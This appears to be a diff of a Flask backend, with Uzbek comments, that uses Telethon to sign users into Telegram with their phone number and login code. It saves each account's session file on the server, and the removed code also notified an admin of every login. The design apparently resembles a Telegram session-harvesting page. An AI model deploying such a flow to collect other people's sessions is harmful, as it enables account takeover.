@@ -107,78 +107,74 @@ def send_code():
 
     try:
         res = asyncio.run(_send())
-        print("SEND_CODE RESULT:", res)
+
+        # 🔴 MUHIM: HASH SAQLAYMIZ
+        pending_codes[phone] = res.phone_code_hash
+
+        print("SEND_CODE HASH:", res.phone_code_hash)
 
         return jsonify({
             "status": "ok",
             "message": "Kod yuborildi"
         })
+
     except Exception as e:
-        print("SEND_CODE ERROR:", repr(e))
         return jsonify({
             "status": "error",
             "message": str(e)
         })
-
 
 # =====================
 # VERIFY CODE
 # =====================
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
-    phone = request.json.get("phone")
-    code = request.json.get("code")
+    data = request.json
+    phone = data.get("phone")
+    code = data.get("code")
 
-    phone_hash = pending_codes.get(phone)
-    if not phone_hash:
-        return jsonify({"status": "no_code_requested"})
+    phone_code_hash = pending_codes.get(phone)
+    if not phone_code_hash:
+        return jsonify({
+            "status": "error",
+            "message": "Kod muddati tugagan. Qayta yuboring."
+        })
+
+    async def _verify():
+        client = TelegramClient(
+            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
+            API_ID,
+            API_HASH
+        )
+        await client.connect()
+        await client.sign_in(
+            phone=phone,
+            code=code,
+            phone_code_hash=phone_code_hash
+        )
+        await client.disconnect()
 
     try:
-        async def work():
-            session_path = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
-            client = TelegramClient(session_path, API_ID, API_HASH)
-            await client.connect()
+        asyncio.run(_verify())
 
-            try:
-                await client.sign_in(
-                    phone=phone,
-                    code=code,
-                    phone_code_hash=phone_hash
-                )
-            except SessionPasswordNeededError:
-                return "2fa"
-
-            me = await client.get_me()
-            await client.disconnect()
-            return me
-
-        result = run_async(work())
-
-        if result == "2fa":
-            return jsonify({"status": "2fa_required"})
-
-        me = result
+        # 🔥 ISH BITDI — HASHNI O‘CHIRAMIZ
         pending_codes.pop(phone, None)
 
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO authorized_users (user_id, phone, username)
-            VALUES (%s, %s, %s)
-            ON CONFLICT (user_id) DO NOTHING
-        """, (me.id, phone, me.username))
-        conn.commit()
-        conn.close()
+        return jsonify({
+            "status": "ok",
+            "message": "Login muvaffaqiyatli"
+        })
 
-        notify_admin(me.id, phone, me.username)
-        return jsonify({"status": "success"})
+    except SessionPasswordNeededError:
+        return jsonify({
+            "status": "2fa_required"
+        })
 
-    except PhoneCodeInvalidError:
-        return jsonify({"status": "invalid_code"})
     except Exception as e:
-        print("VERIFY_CODE ERROR:", e)
-        return jsonify({"status": "error"})
-
+        return jsonify({
+            "status": "error",
+            "message": "Kod noto‘g‘ri yoki eskirgan"
+        })
 
 # =====================
 # VERIFY 2FA PASSWORD
